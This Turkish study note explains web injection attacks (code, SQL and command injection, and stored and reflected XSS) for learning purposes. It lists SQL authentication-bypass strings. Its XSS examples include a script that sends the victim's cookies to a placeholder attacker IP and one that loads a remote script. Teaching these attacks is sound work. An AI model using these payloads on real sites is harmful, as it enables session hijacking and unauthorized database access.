Web uygulamalarıyla ilgili sorun, milyarlarca internet kullanıcısına açık olmaları ve bunların birçoğunun -her ne sebeple olursa olsun- güvenlik önlemlerini kırmak isteyecek olmalarıdır.  
  
İnternetin ilk günlerinde, en yaygın saldırı yöntemlerinden biri basit, basit kaba kuvvetti. Bu saldırıları genellikle botlar ya da hedef uygulamaya erişim sağlayacak bir şifre bulana kadar milyonlarca kullanıcı adı ve şifre kombinasyonunu deneyen bol vakti olan kişiler gerçekleştirirdi.

Enjeksiyon saldırıları sadece kullanıcı adı ve şifreyi bilmeden bir uygulamaya giriş yapmak için değil, aynı zamanda özel, gizli veya hassas bilgileri ifşa etmek ve hatta tüm bir sunucuyu ele geçirmek için de kullanılabilir. Bu nedenle bu saldırılar yalnızca web uygulamaları için değil, aynı zamanda verileri bu uygulamalarda bulunan kullanıcılar ve en kötü durumlarda diğer bağlı uygulamalar ve hizmetler için de bir tehdittir.

Kullanıcılardan gelen girdilerin düzgün parse edilmediği durumlarda sunucu tarafında istenmeyen bir kod çalıştırılmasına sebep olur.

Örneğin:
• SQL Injection – Backend veri deposunu hedef alır 
• Command Injection – İşletim sistemini hedef alır
• Code Injection – Web uygulamasını hedef alır

##  Code injection

Kod enjeksiyonu, en yaygın enjeksiyon saldırı türlerinden biridir. Saldırganlar bir web uygulaması tarafından kullanılan programlama dilini, çerçeveyi, veritabanını veya işletim sistemini biliyorlarsa, web sunucusunu istediklerini yapmaya zorlamak için metin giriş alanları aracılığıyla kod enjekte edebilirler.  
  
Bu tür enjeksiyon saldırıları, girdi verisi doğrulaması olmayan uygulamalarda mümkündür. Bir metin giriş alanı kullanıcıların istedikleri her şeyi girmelerine izin veriyorsa, uygulama potansiyel olarak istismar edilebilir. Bu saldırıları önlemek için uygulamanın, kullanıcıların girmesine izin verilen girdileri olabildiğince kısıtlaması gerekir.

## SQL injection

Kod enjeksiyonuna benzer bir şekilde, bu saldırı bir metin giriş alanına bir SQL komut dosyası (çoğu veritabanı tarafından sorgu işlemlerini gerçekleştirmek için kullanılan dil) ekler. Komut dosyası uygulamaya gönderilir ve uygulama bu komut dosyasını doğrudan veritabanında çalıştırır. Sonuç olarak, saldırgan bir oturum açma ekranından geçebilir veya hassas verileri doğrudan veritabanından okumak, veritabanı verilerini değiştirmek veya yok etmek veya veritabanında yönetici işlemleri yürütmek gibi daha tehlikeli şeyler yapabilir.

PHP ve ASP uygulamaları, eski işlevsel arayüzleri nedeniyle SQL enjeksiyon saldırılarına açıktır. J2EE ve ASP.Net uygulamaları genellikle bu saldırılara karşı daha korunaklıdır. Bir SQL enjeksiyonu açığı bulunduğunda -ki kolayca bulunabilirler- potansiyel saldırıların büyüklüğü yalnızca saldırganın becerisi ve hayal gücü ile sınırlı olacaktır. Bu nedenle, bir SQL enjeksiyonu saldırısının etkisi şüphesiz yüksektir.

• Uygulamadan alınan parametrelerin (girdi) doğrudan veritabanı sunucusuna
gönderilmesi sonucu veritabanı üzerinde izinsiz sorgular çalıştırılabilir.
• Uygulama seviyesinde yeterli girdi denetimi yapılmadığında veya Veritabanı sunucusunda gelen sorguların denetimi yapılmadığında SQLi gerçekleştirilebilir.
• Backend veri deposunu hedef alır.
• Düzgün filtrelenmeyen girdilerden faydalanarak veritabanını manipüle etmeyi sağlayan kod enjeksiyon atağıdır.
• Sebebi girdilerin düzgün parse edilememesidir.
• Yeterli derecede filtre yapılmayan SQL sorgularına ekleme yapılır
• İzinsiz olarak SQL sorgusu çalıştırılabilir.
• Saldırgan veritabanından veri silebilir, veritabanına veri ekleyebilir veya veritabanındaki veriyi değiştirebilir.

![[Pasted image 20231102184848.png]]

•   '--
•   ' or 'a'='a 
•   ' or 'a'='a'--
•   ' or '1'='1 
•   ' or 1=1--
## Command injection

Bu saldırılar, çoğunlukla yetersiz girdi doğrulaması nedeniyle de mümkündür. Kod ekleme saldırılarından farklı olarak saldırgan programlama kodu veya komut dosyaları yerine sistem komutları ekler. Bu nedenle, bilgisayar korsanının uygulamanın dayandığı programlama dilini veya veritabanı tarafından kullanılan dili bilmesine gerek yoktur. Ancak barındırma sunucusu tarafından kullanılan işletim sistemini bilmeleri gerekir.

Eklenen sistem komutları ana bilgisayar işletim sistemi tarafından uygulamanın ayrıcalıklarıyla yürütülür, bu da sunucuda bulunan rastgele dosyaların içeriğinin ifşa edilmesine, bir sunucunun dizin yapısının gösterilmesine, kullanıcı parolalarının değiştirilmesine ve diğer şeylere izin verebilir.  
  
Bu saldırılar, bir sunucuda çalışan web uygulamalarının sistem erişim seviyesini sınırlandırarak bir sistem yöneticisi tarafından önlenebilir.

## Cross-site scripting (XSS)


• Cross Site Scripting (Sitelerarası Betik Çalıştırma) 
• Kurbanın tarayıcısında zararlı kod (en yaygın olarak javascript) çalıştırmaya yönelik olarak yapılan saldırılardır.
• Tarayıcı, gönderilen zararlı kodun web sitesine ait olduğunu düşünerek çalıştırır. 
• İstemci taraflı zafiyet

Bir uygulama, kullanıcıdan gelen girdiyi doğrulamadan veya kodlamadan ürettiği çıktıya eklediğinde, bir saldırgana farklı bir son kullanıcıya kötü amaçlı kod gönderme fırsatı verir. XSS saldırıları bu fırsattan yararlanarak güvenilir web sitelerine kötü niyetli komut dosyaları enjekte eder ve bu kodlar nihayetinde saldırganın kurbanları haline gelen uygulamanın diğer kullanıcılarına gönderilir.  

  
Kurbanların tarayıcısı, güvenilmemesi gerektiğini bilmeden kötü amaçlı komut dosyasını çalıştıracaktır. Bu nedenle tarayıcı, oturum belirteçlerine, çerezlere veya tarayıcı tarafından saklanan hassas bilgilere erişmesine izin verecektir. Düzgün programlanmışsa, komut dosyaları bir HTML dosyasının içeriğini bile yeniden yazabilir.

XSS saldırıları genel olarak iki farklı kategoriye ayrılabilir: stored ve reflected.

Reflected XSS:

• Reflected XSS ile saldırgan sunucuya bir şey kaydetmeden sadece istemci tarafına hatalı betikler yollamaktadır.
• Daha önceden belirlenen bir kurbanın, sosyal mühendislik saldırıları ile yollanan bağlantıya bağlanması sağlanır.

Stored XSS:

• Depolanmış XSS saldırılarında kurbanın ziyaret edeceği tahmin edilen siteye zararlı kod parçası eklenir ve bu kod parçası sunucuya kaydedilir.
• Örneğin, XSS zafiyeti olan bir sitenin anasayfası, forum başlığı veya özel mesaj olarak kurbana iletilebilir.
• Kurban zararlı kod barındıran sitede gezintiye başladığı zaman, kurbanın tarayıcısı otomatik olarak istenilen görevi yerine getirir.
• Genelde forumlar veya kullanıcıların yorum yazma özelliği bulunan mesaj sitelerinde bulunur.
• Saldırganın siteye girip HTML inject edebildiği sitelerde de bulunur.
• En tehlikeli XSS çeşididir. Çünkü biri fark edene kadar sunucuda kaydedilir ve her bağlantıda script çalıştırılır.

XSS SALDIRI ÖRNEKLERİ
• Basit bir pop-up penceresi oluşturulabilir. 
• //www.example.com/index.php?user=guest<script>alert("XSS")</script>

• Kurbanın cookie bilgilerini saldırgana yollayabilir. 
• <script>new image().src="http://saldırganın.IP.ad.resi/b.php? "+document.cookie;</script>

• Uzak bir kaynaktan zararlı bir script çağrılabilir. 
• <script>document.write("<script src=http://example.com/xss.js></script>")</script>

![[Pasted image 20231102185242.png]]


